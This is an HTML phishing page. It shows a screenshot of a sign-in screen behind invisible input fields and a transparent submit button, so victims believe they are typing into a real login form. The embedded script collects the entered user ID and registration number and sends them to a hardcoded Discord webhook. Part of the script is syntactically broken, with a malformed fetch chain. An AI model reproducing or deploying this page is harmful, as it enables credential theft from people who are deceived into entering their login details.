<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Invisible Input Overlay</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        .container {
            position: relative;
            height: 100%;
            background: url('signin.png') no-repeat center center;
            background-size: cover;
        }
        .input-box {
            position: absolute;
            background: transparent;
            border: none;
            outline: none;
            color: black;
            font-size: 16px;
            /* Makes the cursor visible */
            caret-color: black;
        }
        .submit-button {
            position: absolute;
            background: transparent;
            border: none;
            cursor: pointer;
            width: 400px; /* Adjust as needed */
            height: 50px; /* Adjust as needed */
            
        }
    </style>
</head>
<body>

<div class="container">
    <form id="overlayForm">
        <!-- Adjust the 'top' and 'left' values to align with your screenshot's input boxes -->
        <input type="text" name="input1" class="input-box" style="top: 345px; left: 730px; width: 200px; height: 30px;">
        <input type="text" name="input2" class="input-box" style="top: 432.5px; left: 730px; width: 200px; height: 30px;">
        <!-- Adjust the 'top' and 'left' values to align with your screenshot's submit button -->
        <button type="submit" class="submit-button" style="top: 510px; left: 750px;"></button>
    </form>
</div>

<script>
    document.getElementById('overlayForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const input1 = document.getElementsByName('input1')[0].value;
        const input2 = document.getElementsByName('input2')[0].value;

        const webhookURL = 'https://discord.com/api/webhooks/1287249726193930242/_gKgvkDU9GKNYUVg31AF6Nj8zZ6CSR0_fWlzV5GPiLD2JfVc5hfORrI6QjWj1TBY1-oh';

        const payload = {
            content: `User ID: ${input1}\nRegistration Number: ${input2}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        
           
                
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while sending data.');
        });
   
</script>

</body>
</html>
